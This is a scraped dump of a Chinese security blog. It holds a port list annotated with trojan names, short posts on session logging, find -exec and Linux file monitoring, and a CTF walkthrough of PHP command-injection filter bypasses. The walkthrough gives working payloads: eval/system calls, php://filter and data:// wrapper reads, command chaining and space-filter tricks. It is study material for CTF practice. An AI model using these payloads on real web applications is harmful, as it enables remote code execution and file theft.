time软件开放端口\n459端口：ampr-rcmd命令\n464端口：k密码服务\n469端口：广播控制协议\n470端口：scx-代理\n472端口：ljk-登陆\n481端口：Ph服务\n487端口：简单异步文件传输\n489端口：nest-协议\n491端口：go-登陆\n499端口：ISO ILL协议\n500端口：Internet密钥交换，Lsass开放端口，不能关闭\n509端口：陷阱\n510端口：FirstClass协议\n512端口：远程进程执行\n513端口：远程登陆\n514端口：cmd命令\n515端口：spooler\n516端口：可视化数据\n518端口：交谈\n519端口：unix时间\n520端口：扩展文件名称服务器\n525端口：时间服务\n526端口：新日期\n529端口：在线聊天系统服务\n530端口：远程过程调用\n531端口：聊天\n532端口：读新闻\n533端口：紧急广播端口\n534端口：MegaMedia管理端\n537端口：网络流媒体协议\n542端口：商业\n543端口：Kerberos(软件)v4/v5\n544端口：krcmd命令\n546端口：DHCPv6 客户端\n547端口：DHCPv6 服务器\n552端口：设备共享\n554端口：Real Time Stream控制协议\n555端口：木马PhAse1.0、Stealth Spy、IniKiller开放此端口\n556端口：远距离文件服务器\n563端口：基于TLS/SSL的网络新闻传输协议\n564端口：plan 9文件服务\n565端口：whoami查询\n566端口：streettalk\n567端口：banyan-rpc(远程过程调用)\n568端口：DPA成员资格\n569端口：MSN成员资格\n570端口：demon(调试监督程序)\n571端口：udemon(调试监督程序)\n572端口：声纳\n573端口：banyan-贵宾\n574端口：FTP软件代理系统\n581端口：Bundle Discovery 协议\n582端口：SCC安全\n583端口：Philips视频会议\n584端口：密钥服务器\n585端口：IMAP4+SSL (Use 993 instead)\n586端口：密码更改\n587端口：申请\n589端口：Eye连结\n595端口：CAB协议\n597端口：PTC名称服务\n598端口：SCO网络服务器管理3\n599端口：Aeolon Core协议\n600端口：Sun IPC(进程间通讯)服务器\n601端口：可靠系统登陆服务\n604端口：通道\n606端口：Cray统一资源管理\n608端口：发送人-传递/提供 文件传输器\n609端口：npmp-陷阱\n610端口：npmp-本地\n611端口：npmp-gui( 图形用户界面)\n612端口：HMMP指引\n613端口：HMMP操作\n614端口：SSL(加密套接字协议层)shell(壳)\n615端口：Internet配置管理\n616端口：SCO(Unix系统)系统管理服务器\n617端口：SCO桌面管理服务器\n619端口：Compaq(康柏公司)EVM\n620端口：SCO服务器管理\n623端口：ASF远程管理控制协议\n624端口：Crypto管理\n631端口：IPP (Internet打印协议)\n633端口：服务更新(Sterling软件)\n637端口：局域网服务器\n641端口：repcmd命令\n647端口：DHCP(动态主机配置协议)Failover\n648端口：注册登记协议(RRP)\n649端口：Cadview-3d软件协议\n666端口：木马Attack FTP、Satanz Backdoor开放此端口\n808端口：ccproxy http/gopher/ftp (over http)协议\n1001端口：木马Silencer，WebEx开放端口\n1011端口：木马Doly开放端口\n1024端口：动态端口的开始,木马yai开放端口\n1025端口：inetinfo.exe(互联网信息服务)木马netspy开放端口\n1026端口：inetinfo.exe(互联网信息服务)\n1027端口：应用层网关服务\n1030端口：应用层网关服务\n1031端口：BBN IAD\n1033端口：本地网络信息端口\n1034端口：同步通知\n1036端口：安全部分传输协议\n1070端口：木马Psyber Stream，Streaming Audio开放端口\n1071端口：网络服务开放端口\n1074端口：网络服务开放端口\n1080端口：Socks这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET\n1110端口：卡巴斯基反病毒软件开放此端口\n1125端口：卡巴斯基反病毒软件开放此端口\n1203端口：许可证生效端口\n1204端口：登陆请求监听端口\n1206端口：Anthony数据端口\n1222端口：SNI R\u0026amp;D网络端口\n1233端口：普遍的附录服务器端口\n1234端口：木马SubSeven2.0、Ultors Trojan开放此端口\n1243端口：木马SubSeven1.0/1.9开放此端口\n1245端口：木马Vodoo，GabanBus，NetBus，Vodoo开放此端口\n1273端口：EMC-网关端口\n1289端口：JWalk服务器端口\n1290端口：WinJa服务器端口\n1333端口：密码策略(网络服务)(svchost.exe)\n1334端口：网络服务(svchost.exe)\n1335端口：数字公正协议\n1336端口：即时聊天协议(svchost.exe)\n1349端口：注册网络协议端口\n1350端口：注册网络协议端口\n1371端口：富士通配置协议端口\n1372端口：富士通配置协议端口\n1374端口：EPI软件系统端口\n1376端口：IBM个人-个人软件端口\n1377端口：Cichlid许可证管理端口\n1378端口：Elan许可证管理端口\n1380端口：Telesis网络许可证管理端口\n1381端口：苹果网络许可证管理端口\n1386端口：CheckSum 许可证管理端口\n1387端口：系统开放端口(rundll32.exe)\n1388端口：数据库高速缓存端口\n1389端口：文档管理端口\n1390端口：存储控制器端口\n1391端口：存储器存取服务器端口\n1392端口：打印管理端口\n1393端口：网络登陆服务器端口\n1394端口：网络登陆客户端端口\n1395端口：PC工作站管理软件端口\n1396端口：DVL活跃邮件端口\n1397端口：音频活跃邮件端口\n1398端口：视频活跃邮件端口\n1399端口：Cadkey许可证管理端口\n1433端口：Microsoft的SQL服务开放端口\n1434端口：Microsoft的SQL服务监视端口\n1492端口：木马FTP99CMP开放此端口\n1509端口：木马Psyber Streaming Server开放此端口\n1512端口：Microsoft Windows网络名称服务\n1524端口：许多攻击脚本安装一个后门SHELL于这个端口\n1600端口：木马Shivka-Burka开放此端口\n1645端口：远程认证拨号用户服务\n1701端口：第2层隧道协议\n1731端口：NetMeeting音频调用控制\n1801端口：Microsoft消息队列服务器\n1807端口：木马SpySender开放此端口\n1900端口：可被利用ddos攻击，一般关闭\n1912端口：金山词霸开放此端口\n1981端口：木马ShockRave开放此端口\n1999端口：木马BackDoor,yai开放此端口\n2000端口：木马GirlFriend 1.3、Millenium 1.0开放此端口\n2001端口：木马Millenium 1.0、Trojan Cow,黑洞2001开放此端口\n2003端口：GNU 查询\n2023端口：木马Pass Ripper开放此端口\n2049端口：NFS程序常运行于此端口\n2115端口：木马Bugs开放此端口\n2140端口：木马Deep Throat 1.0/3.0，The Invasor开放此端口\n2500端口：应用固定端口会话复制的RPC客户\n2504端口：网络平衡负荷\n2565端口：木马Striker开放此端口\n2583端口：木马Wincrash 2.0开放此端口\n2801端口：木马Phineas Phucker开放此端口\n2847端口：诺顿反病毒服务开放此端口\n3024端口：木马WinCrash开放此端口\n3128端口：squid http代理服务器开放此端口\n3129端口：木马Master Paradise开放此端口\n3150端口：木马The Invasor,deep throat开放此端口\n3210端口：木马SchoolBus开放此端口\n3306端口：MySQL开放此端口\n3333端口：木马Prosiak开放此端口\n3389端口：WINDOWS 2000终端开放此端口\n3456端口：inetinfo.exe(互联网信息服务)开放端口，VAT默认数据\n3457端口：VAT默认控制\n3527端口：Microsoft消息队列服务器\n3700端口：木马Portal of Doom开放此端口\n3996端口：木马RemoteAnything开放此端口\n4000端口：腾讯QQ客户端开放此端口\n4060端口：木马RemoteAnything开放此端口\n4092端口：木马WinCrash开放此端口\n4133端口：NUTS Bootp服务器\n4134端口：NIFTY-Serve HMI协议\n4141端口：Workflow服务器\n4142端口：文档服务器\n4143端口：文档复制\n4145端口：VVR控制\n4321端口：远程Who Is查询\n4333端口：微型sql服务器\n4349端口：文件系统端口记录\n4350端口：网络设备\n4351端口：PLCY网络服务\n4453端口：NSS警报管理\n4454端口：NSS代理管理\n4455端口：PR聊天用户\n4456端口：PR聊天服务器\n4457端口：PR注册\n4480端口：Proxy+ HTTP代理端口\n4500端口：Lsass开放端口，不能关闭\n4547端口：Lanner许可管理\n4555端口：RSIP端口\n4590端口：木马ICQTrojan开放此端口\n4672端口：远程文件访问服务器\n4752端口：简单网络音频服务器\n4800端口：Icona快速消息系统\n4801端口：Icona网络聊天\n4802端口：Icona许可系统服务器\n4848端口：App服务器-Admin HTTP\n4849端口：App服务器-Admin HTTPS\n4950端口：木马IcqTrojan开放5000端口\n5000端口：木马blazer5，Sockets de Troie开放5000端口，一般应关闭\n5001端口：木马Sockets de Troie开放5001端口\n5006端口：wsm服务器\n5007端口：wsm服务器ssl\n5022端口：mice服务器\n5050端口：多媒体会议控制协议\n5051端口：ITA代理\n5052端口：ITA管理\n5137端口：MyCTS服务器端口\n5150端口：Ascend通道管理协议\n5154端口：BZFlag游戏服务器\n5190端口：America-Online(美国在线)\n5191端口：AmericaOnline1(美国在线)\n5192端口：AmericaOnline2(美国在线)\n5193端口：AmericaOnline3(美国在线)\n5222端口：Jabber客户端连接\n5225端口：HP(惠普公司)服务器\n5226端口：HP(惠普公司)\n5232端口：SGI绘图软件端口\n5250端口：i网关\n5264端口：3Com网络端口1\n5265端口：3Com网络端口2\n5269端口：Jabber服务器连接\n5306端口：Sun MC组\n5321端口：木马Sockets de Troie开放5321端口\n5400端口：木马Blade Runner开放此端口\n5401端口：木马Blade Runner开放此端口\n5402端口：木马Blade Runner开放此端口\n5405端口：网络支持\n5409端口：Salient数据服务器\n5410端口：Salient用户管理\n5415端口：NS服务器\n5416端口：SNS网关\n5417端口：SNS代理\n5421端口：网络支持2\n5423端口：虚拟用户\n5427端口：SCO-PEER-TTA(Unix系统)\n5432端口：PostgreSQL数据库\n5550端口：木马xtcp开放此端口\n5569端口：木马Robo-Hack开放此端口\n5599端口：公司远程安全安装\n5600端口：公司安全管理\n5601端口：公司安全代理\n5631端口：pcANYWHERE(软件)数据\n5632端口：pcANYWHERE(软件)数据\n5673端口：JACL消息服务器\n5675端口：V5UA应用端口\n5676端口：RA管理\n5678端口：远程复制代理连接\n5679端口：直接电缆连接\n5720端口：MS-执照\n5729端口：Openmail用户代理层\n5730端口：Steltor\u0026rsquo;s日历访问\n5731端口：netscape(网景)suiteware\n5732端口：netscape(网景)suiteware\n5742端口：木马WinCrash1.03开放此端口\n5745端口：fcopy-服务器\n5746端口：fcopys-服务器\n5755端口：OpenMail(邮件服务器)桌面网关服务器\n5757端口：OpenMail(邮件服务器)X.500目录服务器\n5766端口：OpenMail (邮件服务器)NewMail服务器\n5767端口：OpenMail (邮件服务器)请求代理曾(安全)\n5768端口：OpenMail(邮件服务器) CMTS服务器\n5777端口：DALI端口\n5800端口：虚拟网络计算\n5801端口：虚拟网络计算\n5802端口：虚拟网络计算HTTP访问, d\n5803端口：虚拟网络计算HTTP访问, d\n5900端口：虚拟网络计算机显示0\n5901端口：虚拟网络计算机显示1\n5902端口：虚拟网络计算机显示2\n5903端口：虚拟网络计算机显示3\n6000端口：X Window 系统\n6001端口：X Window 服务器\n6002端口：X Window 服务器\n6003端口：X Window 服务器\n6004端口：X Window 服务器\n6005端口：X Window 服务器\n6006端口：X Window 服务器\n6007端口：X Window 服务器\n6008端口：X Window 服务器\n6009端口：X Window 服务器\n6379端口：Redis默认端口\n6456端口：SKIP证书发送\n6471端口：LVision许可管理器\n6505端口：BoKS管理私人端口\n6506端口：BoKS管理公共端口\n6507端口：BoKS Dir服务器,私人端口\n6508端口：BoKS Dir服务器,公共端口\n6509端口：MGCS-MFP端口\n6510端口：MCER端口\n6566端口：SANE控制端口\n6580端口：Parsec主服务器\n6581端口：Parsec对等网络\n6582端口：Parsec游戏服务器\n6588端口：AnalogX HTTP代理端口\n6631端口：Mitchell电信主机\n6667端口：Internet多线交谈\n6668端口：Internet多线交谈\n6670端口：木马Deep Throat开放此端口\n6671端口：木马Deep Throat 3.0开放此端口\n6699端口：Napster文件(MP3)共享服务\n6701端口：KTI/ICAD名称服务器\n6788端口：SMC软件-HTTP\n6789端口：SMC软件-HTTPS\n6841端口：Netmo软件默认开放端口\n6842端口：Netmo HTTP服务\n6883端口：木马DeltaSource开放此端口\n6939端口：木马Indoctrination开放此端口\n6969端口：木马Gatecrasher、Priority开放此端口\n6970端口：real音频开放此端口\n7000端口：木马Remote Grab开放此端口\n7002端口：使用者\u0026amp; 组 数据库\n7003端口：音量定位数据库\n7004端口：AFS/Kerberos认证服务\n7005端口：音量管理服务\n7006端口：错误解释服务\n7007端口：Basic监督进程\n7008端口：服务器-服务器更新程序\n7009端口：远程缓存管理服务\n7011端口：Talon软件发现端口\n7012端口：Talon软件引擎\n7013端口：Microtalon发现\n7014端口：Microtalon通信\n7015端口：Talon网络服务器\n7020端口：DP服务\n7021端口：DP服务管理\n7100端口：X字型服务\n7121端口：虚拟原型许可证管理\n7300端口：木马NetMonitor开放此端口\n7301端口：木马NetMonitor开放此端口\n7306端口：木马NetMonitor，NetSpy1.0开放此端口\n7307端口：木马NetMonitor开放此端口\n7308端口：木马NetMonitor开放此端口\n7323端口：Sygate服务器端\n7511端口：木马聪明基因开放此端口\n7588端口：Sun许可证管理\n7597端口：木马Quaz开放此端口\n7626端口：木马冰河开放此端口\n7633端口：PMDF管理\n7674端口：iMQ SSL通道\n7675端口：iMQ通道\n7676端口：木马Giscier开放此端口\n7720端口：Med图象入口\n7743端口：Sakura脚本传递协议\n7789端口：木马ICKiller开放此端口\n7797端口：Propel连接器端口\n7798端口：Propel编码器端口\n8000端口：腾讯QQ服务器端开放此端口\n8001端口：VCOM通道\n8007端口：Apache(类似iis)jServ协议1.x\n8008端口：HTTP Alternate\n8009端口：Apache(类似iis)JServ协议1.3\n8010端口：Wingate代理开放此端口\n8011端口：木马way2.4开放此端口\n8022端口：OA-系统\n8080端口：WWW代理开放此端口\n8081端口：ICECap控制台\n8082端口：BlackIce(防止黑客软件)警报发送到此端口\n8118端口：Privoxy HTTP代理\n8121端口：Apollo数据端口\n8122端口：Apollo软件管理端口\n8181端口：Imail\n8225端口：木马灰鸽子开放此端口\n8311端口：木马初恋情人开放此端口\n8351端口：服务器寻找\n8416端口：eSpeech Session协议\n8417端口：eSpeech RTP协议\n8473端口：虚拟点对点\n8668端口：网络地址转换\n8786端口：Message客户端\n8787端口：Message服务器\n8954端口：Cumulus管理端口\n9000端口：CS监听\n9001端口：ETL服务管理\n9002端口：动态id验证\n9021端口：Pangolin验证\n9022端口：PrivateArk远程代理\n9023端口：安全网络登陆-1\n9024端口：安全网络登陆-2\n9025端口：安全网络登陆-3\n9026端口：安全网络登陆-4\n9101端口：Bacula控制器\n9102端口：Bacula文件后台\n9103端口：Bacula存储邮件后台\n9111端口：DragonIDS控制台\n9217端口：FSC通讯端口\n9281端口：软件传送端口1\n9282端口：软件传送端口2\n9346端口：C技术监听\n9400端口：木马Incommand 1.0开放此端口\n9401端口：木马Incommand 1.0开放此端口\n9402端口：木马Incommand 1.0开放此端口\n9594端口：信息系统\n9595端口：Ping Discovery服务\n9800端口：WebDav源端口\n9801端口：Sakura脚本转移协议-2\n9802端口：WebDAV Source TLS/SSL\n9872端口：木马Portal of Doom开放此端口\n9873端口：木马Portal of Doom开放此端口\n9874端口：木马Portal of Doom开放此端口\n9875端口：木马Portal of Doom开放此端口\n9899端口：木马InIkiller开放此端口\n9909端口：域名时间\n9911端口：SYPECom传送协议\n9989端口：木马iNi-Killer开放此端口\n9990端口：OSM Applet程序服务器\n9991端口：OSM事件服务器\n10000端口：网络数据管理协议\n10001端口：SCP构造端口\n10005端口：安全远程登陆\n10008端口：Octopus多路器\n10067端口：木马iNi-Killer开放此端口\n10113端口：NetIQ端点\n10115端口：NetIQ端点\n10116端口：NetIQVoIP鉴定器\n10167端口：木马iNi-Killer开放此端口\n11000端口：木马SennaSpy开放此端口\n11113端口：金山词霸开放此端口\n11233端口：木马Progenic trojan开放此端口\n12076端口：木马Telecommando开放此端口\n12223端口：木马Hack'99 KeyLogger开放此端口\n12345端口：木马NetBus1.60/1.70、GabanBus开放此端口\n12346端口：木马NetBus1.60/1.70、GabanBus开放此端口\n12361端口：木马Whack-a-mole开放此端口\n13223端口：PowWow 客户端，是Tribal Voice的聊天程序\n13224端口：PowWow 服务器，是Tribal Voice的聊天程序\n16959端口：木马Subseven开放此端口\n16969端口：木马Priority开放此端口\n17027端口：外向连接\n19191端口：木马蓝色火焰开放此端口\n20000端口：木马Millennium开放此端口\n20001端口：木马Millennium开放此端口\n20034端口：木马NetBus Pro开放此端口\n21554端口：木马GirlFriend开放此端口\n22222端口：木马Prosiak开放此端口\n23444端口：木马网络公牛开放此端口\n23456端口：木马Evil FTP、Ugly FTP开放此端口\n25793端口：Vocaltec地址服务器\n26262端口：K3软件-服务器\n26263端口：K3软件客户端\n26274端口：木马Delta开放此端口\n27374端口：木马Subseven 2.1开放此端口\n30100端口：木马NetSphere开放此端口\n30129端口：木马Masters Paradise开放此端口\n30303端口：木马Socket23开放此端口\n30999端口：木马Kuang开放此端口\n31337端口：木马BO(Back Orifice)开放此端口\n31338端口：木马BO(Back Orifice)，DeepBO开放此端口\n31339端口：木马NetSpy DK开放此端口\n31666端口：木马BOWhack开放此端口\n31789端口：Hack-a-tack\n32770端口：sun solaris RPC服务开放此端口\n33333端口：木马Prosiak开放此端口\n33434端口：路由跟踪\n34324端口：木马Tiny Telnet Server、BigGluck、TN开放此端口\n36865端口：KastenX软件端口\n38201端口：Galaxy7软件数据通道\n39681端口：TurboNote默认端口\n40412端口：木马The Spy开放此端口\n40421端口：木马Masters Paradise开放此端口\n40422端口：木马Masters Paradise开放此端口\n40423端口：木马Masters Paradise开放此端口\n40426端口：木马Masters Paradise开放此端口\n40843端口：CSCC 防火墙\n43210端口：木马SchoolBus 1.0/2.0开放此端口\n43190端口：IP-PROVISION\n44321端口：PCP服务器(pmcd)\n44322端口：PCP服务器(pmcd)代理\n44334端口：微型个人防火墙端口\n44442端口：ColdFusion软件端口\n44443端口：ColdFusion软件端口\n44445端口：木马Happypig开放此端口\n45576端口：E代时光专业代理开放此端口\n47262端口：木马Delta开放此端口\n47624端口：Direct Play服务器\n47806端口：ALC协议\n48003端口：Nimbus网关\n50505端口：木马Sockets de Troie开放此端口\n50766端口：木马Fore开放此端口\n53001端口：木马Remote Windows Shutdown开放此端口\n54320端口：木马bo2000开放此端口\n54321端口：木马SchoolBus 1.0/2.0开放此端口\n61466端口：木马Telecommando开放此端口\n65000端口：木马Devil 1.03开放此端口\n65301端口：PC Anywhere软件开放端口\n","date":"2021-09-20T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E7%AB%AF%E5%8F%A3%E5%A4%A7%E5%85%A8/","title":"端口大全"},{"content":"​\t当有人使用你的电脑时，或者有人远程登录到你的机器时，你肯定想尽量详细的记录下别人做的一切。众所周知有个 history命令可以记录下在终端上敲下的命令，但是却无法复现出这些命令输出到终端的信息，这时就可以使用 script 命令，该命令是linux的系统命令，非常简单好用。\n如何使用 ​\t我们可以直接在命令行中输入 script 命令来启动。先来看一下帮助文档。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  Usage: script [options] [file] Make a typescript of a terminal session. Options: -a, --append append the output -c, --command \u0026lt;command\u0026gt; run command rather than interactive shell -e, --return return exit code of the child process -f, --flush run flush after each write --force use output file even when it is a link -o, --output-limit \u0026lt;size\u0026gt; terminate if output files exceed size -q, --quiet be quiet -t[\u0026lt;file\u0026gt;], --timing[=\u0026lt;file\u0026gt;] output timing data to stderr or to FILE -h, --help display this help -V, --version display version   ​\tscript 命令可以指定文件名来记录打印结果，之后目标文件就可以记录下输出在终端上的文本信息。\n​\t使用 Crtl + D 退出，或者输入 exit 。\n​\t和该命令配套的还有一个 scriptreplay ，可以用来重放保存后的文件，但是该命令并不是系统默认命令而是需要安装， 如何安装呢？其实这个脚本是一个pl脚本，在 util-linux 这个包里可以找到它。在安装前一定要安装gcc，如果不安装在编译的时候肯定报错，安装后就可以使用了。（参考文章）\n自动化 ​\t可以使用bash脚本让 script 命令在有人登陆后自动运行，我们可以把它添加进shell环境配置文件中。如果你正在使用bash shell，把这一行加进你的bash环境配置文件中。\n1 2 3 4 5 6  $ vi ~/.profile # run the script command to record everything # use -q for quite and -a option to append the script # /usr/bin/script -qa /usr/local/script/log_record_script   然后保存。下次他登录进你的系统时，script命令就会自动运行，并把日志记录进 /usr/local/script/logrecordscript 。\n","date":"2021-09-14T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%8E%A7/","title":"用户行为监控"},{"content":"1  find -type f   该命令可以列出当前目录下（包括子目录）所有文件。\nexec命令说明 -exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。{} 花括号代表前面find查找出来的文件名。这里只罗列出与find有关的用法与说明，详细说明请自行查询。\n示例 1.查找目录及子目录下全部文件并对结果执行ls -lah\n1 2 3 4 5 6  find -type f -exec ls -lah {} \\; 输出 root@kali:~/Tools/post-poc# find -type f -exec ls -lah {} \\; -rwxrw-rw- 1 root root 826 12月 28 2020 ./post—poc.html -rwxrw-rw- 1 root root 37 12月 27 2020 ./command.php   2.查找当前目录下一天内更改过的文件\n1  find -type f -mtime -1 -exec ls -lah {} \\;   3.查找当前目录下文件名以.log结尾且24小时内更改过的文件\n1  find -name \u0026#34;*.log\u0026#34; -type f -mtime -1 -exec ls -lah {} \\;   ","date":"2021-09-13T00:00:00Z","permalink":"https://lunaasuka.github.io/p/find%E5%91%BD%E4%BB%A4%E7%89%B9%E6%AE%8A%E7%94%A8%E6%B3%95/","title":"find命令特殊用法"},{"content":"知识点记录 首先介绍一个工具，是一款开源的十分好用的资源监控工具——glances。glances是一个基于python语言开发，可以为linux或者UNIX性能提供监视和分析性能数据的功能。glances在用户的终端上显示重要的系统信息，并动态的进行更新，让管理员实时掌握系统资源的使用情况，而动态监控并不会消耗大量的系统资源，比如CPU资源，通常消耗小于2%，glances默认每两秒更新一次数据。同时glances还可以将相同的数据捕获到一个文件，便于以后对报告进行分析和图形绘制，支持的文件格式有.csv电子表格格式和和html格式。\nglances可以分析系统的：\n CPU使用率 内存使用率 内核统计信息和运行队列信息 磁盘I/O速度、传输和读/写比率 磁盘适配器 网络I/O速度、传输和读/写比率 页面监控 进程监控-消耗资源最多的进程 计算机信息和系统资源  安装也比较简单，他们的github界面提供了多种安装方式，我这边就简单的pip3 install glances安装了。\n关于该工具的使用方法国内也有不少人写过文章，详细内容请自己去搜寻。\n监控linux下文件变化 **1）**使用find -ctime (参数) 命令\n该命令可以查看参数时间内发生过变动的文件。\n例如find -ctime -5可以找出5天内变化过的文件，之后可以结合exec命令进行其他操作。有关find的一些用法请看我的另一篇文章“find命令特殊用法”\nps：这里既可以使用ctime也可以使用mtime，两者稍有差异，但是网上对此的解析比较少（但是各类教程使用mtime的倒是很多\u0026hellip;），所以大家斟酌着使用，习惯用哪个就用哪个。\n**2）**使用Iynis工具\n这里是lynis的官方网站。\nLynis 是一款运行在 Unix/Linux 平台上的基于主机的、开源的安全审计软件。Lynis是针对Unix/Linux的安全检查工具，可以发现潜在的安全威胁。这个工具覆盖可疑文件监测、漏洞、恶意程序扫描、配置错误等。 笔者暂时还没有研究该工具，以后可能会单独写一篇文章来介绍该工具。\n**3）**通过脚本来进行文件md5监控\n我们可以简单的计算一个文件的md5值然后记录下来，之后如果进行比对的时候这个值发生变化了则该文件已经被更改过了。网上开源的脚本不少，我在这里就不做介绍了，有需求的同学请自寻。\n2021-9-29日注：发现了一个工具可以用来监测文件特征值，比使用脚本方便的多，叫 aide ,我这边没有安装也尚未进行测试，但是网上有关的教程和实验很多，大家可以去查查看。\n","date":"2021-09-13T00:00:00Z","permalink":"https://lunaasuka.github.io/p/linux%E6%96%87%E4%BB%B6%E5%AE%89%E5%85%A8%E7%9B%91%E6%B5%8B/","title":"linux文件安全监测"},{"content":"开始入门 web29 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); }   这道题姿势很多，为了循序渐进我不会放出特别多的payload，其他姿势请大家根据后续学习的知识自行探索。\npayload：c=system(\u0026ldquo;cat fla*\u0026quot;);\n使用通配符 * ，计算机会自行寻找合适的文件打开。\nweb30 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); }   跟上一道题比起来多过滤了system和php两个关键字。只要不用这两个就好了。\npayload：c=echo exec(\u0026lsquo;cat fla*');\n众所周知system()函数可以用来执行系统命令，除了它以外仍然有许多命令执行函数。\n1 2 3 4 5 6 7 8  system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号 即` ` 同shell_exec()   web31 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); }   这里过滤了cat，还有其他的东西。自然不用cat就好。\npayload: c=echo(tac%09f*);\n1 2 3 4 5 6 7 8 9 10 11 12 13  more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如\t下命令： grep test *file   web32 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); }   过滤的数量逐渐变多。\npayload：?c=include $_GET[\u0026ldquo;asuka\u0026rdquo;] ?\u0026gt;\u0026amp;asuka=php://filter/read=convert.base64-encode/resource=flag.php\nweb33 - 36 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); }   跟上一题没啥区别。\npayload：?c=include $_GET[\u0026ldquo;asuka\u0026rdquo;]?\u0026gt;\u0026amp;asuka=php://filter/read=convert.base64-encode/resource=flag.php\n顺带一提可以使用post形式的payload。\n?c=include$_POST[asuka]?\u0026gt; asuka=php://filter/read=convert.base64-encode/resource=flag.php\nweb37 1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); }   看似过滤的只有flag，实则是文件包含，选择使用伪协议。\npayload：data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n这里使用了data伪协议，会将后续的输入当做php代码执行，由于过滤了flag，所以这里采用了base64编码进行绕过。\nweb38-39 1 2 3 4 5 6 7 8 9 10 11 12 13 14  \u0026lt;?php //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); }   相比上一题过滤了php和file。\npayload：data://text/plain;base64, PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=\nweb40 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); }   这里过滤了许多符号，这道题可以使用无参数读取。\n无参数读取。首先使用 scandir(current(localeconv())) 查看当前目录所有文件名。\n我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，成功读取flag.php文件。\npayload:?c=highlight_flie(next(array_reverse(scandir(current(localeconv())))));\nweb41 很难。\n这里放上大佬的wp。\nweb42 1 2 3 4 5 6 7 8  \u0026lt;?php if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); }else{ highlight_file(__FILE__); }   \u0026gt;/dev/null 2\u0026gt;\u0026amp;1主要意思是不进行回显的意思 。\n我们要让命令回显，那么进行命令分隔即可\n;\t//分号 |\t//只执行后面那条命令 ||\t//只执行前面那条命令 \u0026amp;\t//两条命令都会执行 \u0026amp;\u0026amp;\t//两条命令都会执行\npayload：cat flag.php;\nwebpayload: cat flag.php||\nweb43 多过滤了cat和分号。换一个就好。\npayload: tac%20flag.php%0a\nweb44 多过滤一个flag，通配符解决。\npayload: tac%20fla*%0a\nweb45 多过滤了一个空格，众所周知php环境下可以用%09代替空格。\npayload: tac%09fla*%0a\n1 2 3 4 5 6 7  \u0026gt;` `\u0026lt;` `\u0026lt;\u0026gt;` 重定向符 `%09`(需要php环境) `${IFS}` `$IFS$9` `{cat,flag.php}` //用逗号实现了空格功能 `%20` `%09   